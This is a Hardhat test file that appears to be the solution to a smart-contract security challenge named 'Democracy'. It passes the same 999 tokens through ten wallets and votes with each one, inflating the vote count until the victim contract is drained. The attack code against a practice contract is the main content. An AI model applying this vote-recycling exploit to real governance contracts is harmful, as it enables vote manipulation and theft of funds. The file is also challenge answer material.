const {
    time,
    loadFixture,
} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "Democracy";

describe(NAME, function () {
    async function setup() {
        const [owner, attackerWallet1, attackerWallet2, attackerWallet3, attackerWallet4, attackerWallet5, attackerWallet6, attackerWallet7, attackerWallet8, attackerWallet9, attackerWallet10, attackerWallet11] = await ethers.getSigners();

        const value = ethers.utils.parseEther("1");

        const VictimFactory = await ethers.getContractFactory(NAME);
        const victimContract = await VictimFactory.deploy({ value });

        return { victimContract,owner, attackerWallet1, attackerWallet2, attackerWallet3, attackerWallet4, attackerWallet5, attackerWallet6, attackerWallet7, attackerWallet8, attackerWallet9, attackerWallet10 };
    }

    describe("exploit", async function () {
        let  victimContract,owner, attackerWallet1, attackerWallet2, attackerWallet3, attackerWallet4, attackerWallet5, attackerWallet6, attackerWallet7, attackerWallet8, attackerWallet9, attackerWallet10;
        before(async function () {
            (
                { victimContract,owner, attackerWallet1, attackerWallet2, attackerWallet3, attackerWallet4, attackerWallet5, attackerWallet6, attackerWallet7, attackerWallet8, attackerWallet9, attackerWallet10 } 
                = await loadFixture(setup,)
            );
        });

        it("conduct your attack here", async function () {
            const mintTx = await victimContract.mint(attackerWallet1.address, 999, {value:ethers.utils.parseEther("1000")});
            await mintTx.wait();
            const voteTx1 = await victimContract.connect(attackerWallet1).vote(ethers.constants.AddressZero)
            await voteTx1.wait()

            const transferTx1 = await victimContract.connect(attackerWallet1).transferFrom(attackerWallet1.address, attackerWallet2.address, 999)
            await transferTx1.wait()
            const voteTx2 = await victimContract.connect(attackerWallet2).vote(ethers.constants.AddressZero)
            await voteTx2.wait()

            const transferTx2 = await victimContract.connect(attackerWallet2).transferFrom(attackerWallet2.address, attackerWallet3.address, 999)
            await transferTx2.wait()
            const voteTx3 = await victimContract.connect(attackerWallet3).vote(ethers.constants.AddressZero)
            await voteTx3.wait()

            const transferTx3 = await victimContract.connect(attackerWallet3).transferFrom(attackerWallet3.address, attackerWallet4.address, 999)
            await transferTx3.wait()
            const voteTx4 = await victimContract.connect(attackerWallet4).vote(ethers.constants.AddressZero)
            await voteTx4.wait()

            const transferTx4 = await victimContract.connect(attackerWallet4).transferFrom(attackerWallet4.address, attackerWallet5.address, 999)
            await transferTx4.wait()
            const voteTx5 = await victimContract.connect(attackerWallet5).vote(ethers.constants.AddressZero)
            await voteTx5.wait()

            const transferTx5 = await victimContract.connect(attackerWallet5).transferFrom(attackerWallet5.address, attackerWallet6.address, 999)
            await transferTx5.wait()
            const voteTx6 = await victimContract.connect(attackerWallet6).vote(ethers.constants.AddressZero)
            await voteTx6.wait()

            const transferTx6 = await victimContract.connect(attackerWallet6).transferFrom(attackerWallet6.address, attackerWallet7.address, 999)
            await transferTx6.wait()
            const voteTx7 = await victimContract.connect(attackerWallet7).vote(ethers.constants.AddressZero)
            await voteTx7.wait()

            const transferTx7 = await victimContract.connect(attackerWallet7).transferFrom(attackerWallet7.address, attackerWallet8.address, 999)
            await transferTx7.wait()
            const voteTx8 = await victimContract.connect(attackerWallet8).vote(ethers.constants.AddressZero)
            await voteTx8.wait()

            const transferTx8 = await victimContract.connect(attackerWallet8).transferFrom(attackerWallet8.address, attackerWallet9.address, 999)
            await transferTx8.wait()
            const voteTx9 = await victimContract.connect(attackerWallet9).vote(ethers.constants.AddressZero)
            await voteTx9.wait()

            const transferTx9 = await victimContract.connect(attackerWallet9).transferFrom(attackerWallet9.address, attackerWallet10.address, 999)
            await transferTx9.wait()
            const voteTx10 = await victimContract.connect(attackerWallet10).vote(ethers.constants.AddressZero)
            await voteTx10.wait()



        });

        after(async function () {
            const victimContractBalance = await ethers.provider.getBalance(
                victimContract.address,
            );
            expect(victimContractBalance).to.be.equal("0");
        });
    });
});
